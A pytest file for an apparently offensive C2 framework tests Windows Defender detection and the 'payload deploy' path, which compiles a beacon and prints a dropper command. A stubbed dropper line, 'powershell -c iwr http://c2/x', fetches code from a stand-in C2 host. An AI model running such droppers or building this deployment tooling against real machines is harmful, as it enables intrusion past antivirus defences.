"""Defender detection AND the call site that makes it worth having.

The utility landed with a test and no caller, so the test proved only that the
registry probe parses. These tests pin the behaviour the deploy path needs: on
a Windows target with Defender, the quarantine caveat is printed BEFORE the
dropper — and on every other combination nothing is printed, because a warning
that fires without evidence is noise the operator learns to ignore.
"""
import builtins
import pytest


@pytest.fixture(autouse=True)
def _restore_winreg():
    """The detection test installs a fake ``winreg``; never leak it to others."""
    import sys

    had = "winreg" in sys.modules
    previous = sys.modules.get("winreg")
    try:
        yield
    finally:
        if had:
            sys.modules["winreg"] = previous
        else:
            sys.modules.pop("winreg", None)


def test_is_defender_present_monkeypatched(monkeypatch):
    """Simulate the presence of the Defender registry key.

    The test replaces ``winreg.OpenKey`` with a dummy that pretends the key
    exists, ensuring the function returns ``True`` without touching the real
    registry. A second scenario forces an exception to verify ``False``.
    """
    # Simulate success
    class DummyKey:
        def __enter__(self):
            return self
        def __exit__(self, exc_type, exc, tb):
            return False

    def fake_open_key_success(*args, **kwargs):
        return DummyKey()

    import sys
    fake_mod = type("winreg", (), {"OpenKey": fake_open_key_success, "HKEY_LOCAL_MACHINE": None})
    sys.modules["winreg"] = fake_mod
    from phantom.utils.defender_check import is_defender_present
    assert is_defender_present() is True

    # Simulate failure (ImportError or key missing)
    def fake_open_key_fail(*args, **kwargs):
        raise OSError("key not found")

    fake_mod_fail = type("winreg", (), {"OpenKey": fake_open_key_fail, "HKEY_LOCAL_MACHINE": None})
    sys.modules["winreg"] = fake_mod_fail
    assert is_defender_present() is False


# ── the note itself ─────────────────────────────────────────────────────────

def test_note_says_quarantine_and_the_missing_check_in(monkeypatch):
    from phantom.utils import defender_check

    monkeypatch.setattr(defender_check, "is_defender_present", lambda: True)
    note = defender_check.defender_note("Windows").lower()
    assert "quarantin" in note
    assert "not proof the payload failed" in note


def test_note_is_empty_without_defender(monkeypatch):
    from phantom.utils import defender_check

    monkeypatch.setattr(defender_check, "is_defender_present", lambda: False)
    assert defender_check.defender_note("windows") == ""


def test_note_is_windows_only(monkeypatch):
    """A Linux/macOS target gets nothing, even on a Windows operator box."""
    from phantom.utils import defender_check

    monkeypatch.setattr(defender_check, "is_defender_present", lambda: True)
    assert defender_check.defender_note("linux") == ""
    assert defender_check.defender_note("macos") == ""
    assert defender_check.defender_note("") == ""


# ── the deploy path prints it, before the dropper ───────────────────────────

@pytest.fixture
def windows_deploy(monkeypatch):
    """`payload deploy` with the toolchain, transport and listener stubbed."""
    import phantom.modules.payload as payload_module
    from phantom.utils import defender_check

    class _Verdict:
        approved = True

        def summary(self):
            return "bench approval"

    monkeypatch.setattr(payload_module.PayloadModule, "_guess_os",
                        lambda self: ("Windows 11", "x64", "windows"))
    monkeypatch.setattr("phantom.utils.builder.compile_beacon",
                        lambda *a, **kw: "C:/tmp/beacon.exe")
    monkeypatch.setattr("phantom.utils.builder.generate_dropper",
                        lambda *a, **kw: "powershell -c iwr http://c2/x")
    monkeypatch.setattr("phantom.utils.network.get_c2_endpoint",
                        lambda: ("10.0.0.5", 8443))
    monkeypatch.setattr("phantom.utils.network.c2_use_ssl", lambda: False)
    monkeypatch.setattr("phantom.utils.c2_crypto.beacon_config_endpoint",
                        lambda *a, **kw: ("10.0.0.5", 8443))
    monkeypatch.setattr("phantom.utils.beacon_artifacts.payload",
                        lambda *a, **kw: None)
    monkeypatch.setattr(
        "phantom.automation.sandbox.sandbox.SandboxEngine.preflight",
        lambda self, path: _Verdict())
    monkeypatch.setattr("phantom.core.automode.ensure_c2_listener",
                        lambda *a, **kw: True)
    return payload_module, defender_check


def _deploy_output(capsys) -> str:
    captured = capsys.readouterr()
    return (captured.out + captured.err).lower()


def test_deploy_prints_the_caveat_before_the_dropper(monkeypatch, capsys,
                                                     windows_deploy):
    payload_module, defender_check = windows_deploy
    monkeypatch.setattr(defender_check, "is_defender_present", lambda: True)

    payload_module.PayloadModule().do_deploy("")
    text = _deploy_output(capsys)

    assert "quarantin" in text, "the Windows caveat was never printed"
    assert "deploy command" in text, "the dropper line disappeared"
    assert text.index("quarantin") < text.index("deploy command"), \
        "the caveat must precede the command the operator is about to paste"


def test_deploy_warns_for_a_windows_target_without_a_local_scanner(
        monkeypatch, capsys, windows_deploy):
    """The TARGET ships Defender even when this box has none to scan with.

    This test used to assert the opposite ("quarantin" not in text), i.e. it
    encoded the defect measured 2026-11-03: the caveat was gated on the
    OPERATOR's registry, so a Linux or macOS operator deploying to a Windows
    target was told nothing about the machine the payload actually runs on.
    """
    payload_module, defender_check = windows_deploy
    monkeypatch.setattr(defender_check, "is_defender_present", lambda: False)

    payload_module.PayloadModule().do_deploy("")
    text = _deploy_output(capsys)

    assert "quarantin" in text, "a Windows target must always be warned"
    assert "unknown" in text, "an unscanned build must not read as clean"
    assert "deploy command" in text, "the deploy path changed its exit"


def test_deploy_still_works_on_a_non_windows_target(monkeypatch, capsys,
                                                    windows_deploy):
    """The note is Windows-only: a Linux drop prints the dropper, no caveat."""
    payload_module, defender_check = windows_deploy
    monkeypatch.setattr(defender_check, "is_defender_present", lambda: True)
    monkeypatch.setattr(payload_module.PayloadModule, "_guess_os",
                        lambda self: ("Ubuntu 22.04", "x64", "linux"))

    payload_module.PayloadModule().do_deploy("")
    text = _deploy_output(capsys)

    assert "quarantin" not in text
    assert "deploy command" in text
